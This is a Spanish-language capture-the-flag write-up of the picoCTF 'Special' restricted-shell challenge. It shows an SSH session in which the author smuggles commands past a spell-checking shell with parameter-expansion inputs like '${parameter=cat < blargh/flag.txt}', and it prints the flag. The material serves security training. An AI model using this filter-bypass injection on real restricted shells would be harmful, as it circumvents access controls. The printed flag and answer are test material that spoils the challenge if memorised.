## Descripción
```
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.

Additional details will be available after launching your challenge instance.
```
## Solución
```
porti_04@DESKTOP-8HT902T:~$ ssh -p 60645 ctf-player@saturn.picoctf.net
ctf-player@saturn.picoctf.net's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Sep 18 05:01:42 2024 from 127.0.0.1

1. Comencé enumerando las carpetas o archivos disponibles y seguí secuencialmente la siguiente tabla

|Dominio|Producción|
|---|---|
|${parámetro?ls}|parámetro: ls|
|${:ls}|Mala sustitución|
|${parámetro=ls}|Blargh|
|${parámetro=gato blargh}|cat: blargh: Es un directorio|
|${parámetro=cd blargh}|${parámetro=cd blargh}|
|${parámetro=ls blargh}|bandera.txt|
|${parámetro=cat < blargh/flag.txt}|Esto le dio la bandera|

Special$ ${parameter?ls}
${parameter?ls}
sh: 1: parameter: ls
Special$ ${:ls}
${:ls}
sh: 1: Bad substitution
Special$ ${parameter=ls}
${parameter=ls}
blargh
Special$ ${parameter=cat blargh}
${parameter=cat blargh}
cat: blargh: Is a directory
Special$ ${parameter=cd blargh}
${parameter=cd blargh}
Special$ ${parameter=ls blargh}
${parameter=ls blargh}
flag.txt
Special$ ${parameter=cat < blargh/flag.txt}
${parameter=cat < blargh/flag.txt}
cat: '<': No such file or directory
picoCTF{5p311ch3ck_15_7h3_w0r57_f578af59}Special$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
porti_04@DESKTOP-8HT902T:~$
```

## Notas 
```
Busque en internet la tabla que me ayudo a solucionar el reto
```

## Referencias
````
https://josephkimiri.github.io/posts/Special/
```